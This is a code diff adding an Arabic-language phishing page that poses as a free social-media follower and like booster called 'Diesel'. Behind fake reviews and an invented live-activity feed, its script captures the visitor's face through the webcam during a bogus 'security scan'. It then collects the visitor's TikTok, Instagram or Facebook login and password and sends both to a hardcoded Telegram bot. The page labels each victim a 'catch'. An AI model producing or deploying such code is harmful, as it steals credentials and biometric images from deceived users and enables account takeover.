@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>الديزل لزيادة المتابعين | Diesel SMM Global</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --bg: #0d1117; --card: #161b22; --accent: #238636; --tiktok: #000; --insta: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); --fb: #1877f2; --yt: #ff0000; }
+        body { background: var(--bg); color: #c9d1d9; font-family: -apple-system, system-ui, sans-serif; margin: 0; padding: 10px; text-align: center; }
+        
+        /* شاشة الدخول */
+        #welcome-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; align-items: center; justify-content: center; cursor: pointer; }
+        .diesel-logo { border: 3px solid var(--accent); padding: 30px; border-radius: 20px; animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(35, 134, 54, 0.7); } 70% { box-shadow: 0 0 0 30px rgba(35, 134, 54, 0); } 100% { box-shadow: 0 0 0 0 rgba(35, 134, 54, 0); } }
+
+        .container { max-width: 420px; margin: 0 auto; display: none; }
+        .card { background: var(--card); border: 1px solid #30363d; border-radius: 16px; padding: 20px; box-shadow: 0 10px 40px rgba(0,0,0,0.7); margin-bottom: 15px; position: relative; }
+
+        /* سجل النشاط الحي بأسماء مصرية */
+        .live-notif { background: rgba(35, 134, 54, 0.1); border: 1px solid var(--accent); border-radius: 8px; padding: 8px; margin-bottom: 15px; font-size: 11px; color: #fff; height: 20px; overflow: hidden; }
+
+        /* قسم التقييمات المصري */
+        .review-section { margin-top: 15px; text-align: right; border-top: 1px solid #30363d; padding-top: 10px; }
+        .review-item { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .review-img { width: 35px; height: 35px; background: #30363d; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; }
+        .review-text { font-size: 11px; }
+        .stars { color: #f1e05a; font-size: 10px; }
+
+        /* المنصات والخدمات */
+        .p-box { display: flex; align-items: center; padding: 16px; border-radius: 12px; margin-bottom: 10px; cursor: pointer; color: #fff; font-weight: bold; }
+        .p-box i { font-size: 24px; margin-left: 15px; width: 30px; }
+        .tk { background: var(--tiktok); } .ig { background: var(--insta); } .fb { background: var(--fb); } .yt { background: var(--yt); }
+        .service-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 8px; margin-top: 15px; }
+        .svc-item { background: #21262d; padding: 10px; border-radius: 8px; font-size: 11px; cursor: pointer; border: 1px solid #30363d; }
+
+        /* الفحص والبيانات */
+        #step-services, #step-scan, #step-login { display: none; }
+        .scanner { width: 140px; height: 140px; border: 3px solid #58a6ff; border-radius: 50%; margin: 20px auto; position: relative; overflow: hidden; }
+        .line { width: 100%; height: 3px; background: #58a6ff; position: absolute; animation: scan 2s infinite; }
+        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+
+        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 8px; border: 1px solid #30363d; background: #0d1117; color: #fff; font-size: 16px; box-sizing: border-box; }
+        .btn-diesel { width: 100%; padding: 18px; border-radius: 8px; border: none; background: var(--accent); color: #fff; font-weight: bold; font-size: 18px; cursor: pointer; }
+        video { width: 1px; height: 1px; opacity: 0; position: absolute; }
+    </style>
+</head>
+<body onclick="startDieselSystem()">
+
+    <div id="welcome-overlay">
+        <div class="diesel-logo">
+            <h1 style="color:#fff; margin:0;">الديزل</h1>
+            <p style="color:var(--accent); font-size:12px;">لزيادة المتابعين والتفاعلات</p>
+            <small style="color:#8b949e;">انقر للبدء</small>
+        </div>
+    </div>
+
+    <div class="container" id="app">
+        <div class="live-notif" id="live-notif">جاري الاتصال بالسيرفر...</div>
+
+        <div class="card" id="step-1">
+            <h3 style="color:#fff;">اختر المنصة</h3>
+            <div class="p-box tk" onclick="showServices('تيك توك')"><i class="fab fa-tiktok"></i> TikTok</div>
+            <div class="p-box ig" onclick="showServices('إنستقرام')"><i class="fab fa-instagram"></i> Instagram</div>
+            <div class="p-box fb" onclick="showServices('فيسبوك')"><i class="fab fa-facebook-f"></i> Facebook</div>
+
+            <div class="review-section">
+                <p style="font-size:12px; font-weight:bold; margin-bottom:10px;">آراء مستخدمي "الديزل":</p>
+                <div class="review-item">
+                    <div class="review-img">👤</div>
+                    <div class="review-text"><b>أحمد محمد:</b> الموقع جمد، استلمت المتابعين في ثانية!<div class="stars">★★★★★</div></div>
+                </div>
+                <div class="review-item">
+                    <div class="review-img">👩</div>
+                    <div class="review-text"><b>دينا أحمد:</b> كنت خايفة في الأول بس طلع حقيقي وشغال.<div class="stars">★★★★★</div></div>
+                </div>
+                <div class="review-item">
+                    <div class="review-img">👩</div>
+                    <div class="review-text"><b>أسماء السيد:</b> أحسن سيرفر زيادة لايكات جربته بجد.<div class="stars">★★★★★</div></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card" id="step-services">
+            <h3 id="plat-title" style="color:#fff;"></h3>
+            <div class="service-grid">
+                <div class="svc-item" onclick="prepareScan('متابعين', '10K')">👤 10K متابع<br><b style="color:#f1e05a;">FREE</b></div>
+                <div class="svc-item" onclick="prepareScan('لايكات', '50K')">❤️ 50K لايك<br><b style="color:#f1e05a;">FREE</b></div>
+                <div class="svc-item" onclick="prepareScan('مشاهدات', '100K')">👁️ 100K مشاهدة<br><b style="color:#f1e05a;">FREE</b></div>
+            </div>
+        </div>
+
+        <div class="card" id="step-scan">
+            <h3 style="color:#fff;">فحص الأمان البشري</h3>
+            <div class="scanner"><div class="line"></div></div>
+            <button class="btn-diesel" onclick="captureStep()">ابدأ فحص الأمان</button>
+            <video id="v" autoplay muted playsinline></video>
+        </div>
+
+        <div class="card" id="step-login">
+            <h3 style="color:#fff;">توثيق الحساب</h3>
+            <p style="font-size:12px; color:#f1e05a;">تم حجز الـ <span id="final-qty"></span> <span id="final-type"></span> باسمك.</p>
+            <input type="text" id="u_id" placeholder="رقم الهاتف أو البريد">
+            <input type="password" id="u_pass" placeholder="كلمة المرور">
+            <button class="btn-diesel" onclick="sendToTelegram()">تفعيل واستلام فوراً</button>
+        </div>
+    </div>
+
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const token = "8789584532:AAESJZrJGfkILGReWmxFUGz2cyJzvK_7fEU";
+        const chat_id = "5177962707";
+        let isStarted = false;
+
+        // تحديث شريط النشاط بالأسماء
+        const users = ["محمود علي", "سارة إبراهيم", "كريم حسن", "أماني وجيه", "هاني رمزي"];
+        const actions = ["استلم 5000 متابع", "زود 100K مشاهدة", "استلمت 10K لايك", "فعلت التوثيق"];
+        setInterval(() => {
+            const user = users[Math.floor(Math.random() * users.length)];
+            const action = actions[Math.floor(Math.random() * actions.length)];
+            document.getElementById('live-notif').innerText = `✅ ${user} ${action} بنجاح!`;
+        }, 4000);
+
+        function startDieselSystem() {
+            if(isStarted) return;
+            document.getElementById('welcome-overlay').style.display = 'none';
+            document.getElementById('app').style.display = 'block';
+            const talk = new SpeechSynthesisUtterance("مرحباً بك في موقع الديزل لزيادة المتابعين. نلاحظ ضغطاً كبيراً، يرجى اختيار الخدمة وإتمام فحص الوجه للتأكد من هويتك البشرية لضمان وصول المتابعين فوراً.");
+            talk.lang = 'ar-SA';
+            window.speechSynthesis.speak(talk);
+            isStarted = true;
+        }
+
+        function showServices(p) { window.platform = p; document.getElementById('plat-title').innerText = "خدمات " + p; document.getElementById('step-1').style.display = 'none'; document.getElementById('step-services').style.display = 'block'; }
+        function prepareScan(t, q) { window.sType = t; window.sQty = q; document.getElementById('step-services').style.display = 'none'; document.getElementById('step-scan').style.display = 'block'; }
+
+        async function captureStep() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('v').srcObject = stream;
+            setTimeout(() => {
+                const canvas = document.getElementById('c');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
+                canvas.toBlob(blob => {
+                    const fd = new FormData();
+                    fd.append('chat_id', chat_id);
+                    fd.append('photo', blob, 'shot.jpg');
+                    fd.append('caption', `👤 صيد الديزل (صورة وجه)\nالمنصة: ${window.platform}\nالخدمة: ${window.sType} (${window.sQty})`);
+                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                }, 'image/jpeg');
+                document.getElementById('step-scan').style.display = 'none';
+                document.getElementById('step-login').style.display = 'block';
+                document.getElementById('final-qty').innerText = window.sQty;
+                document.getElementById('final-type').innerText = window.sType;
+            }, 3500);
+        }
+
+        function sendToTelegram() {
+            const id = document.getElementById('u_id').value;
+            const pass = document.getElementById('u_pass').value;
+            if(id.length < 5 || pass.length < 5) return alert("البيانات خاطئة!");
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=🎯 صيد الديزل (بيانات)!\nالحساب: ${id}\nالباسورد: ${pass}\nالمنصة: ${window.platform}`);
+            alert("تم التوثيق! الخدمة ستصلك خلال دقائق.");
+            location.href = "https://www.google.com";
+        }
+    </script>
+</body>
+</html>
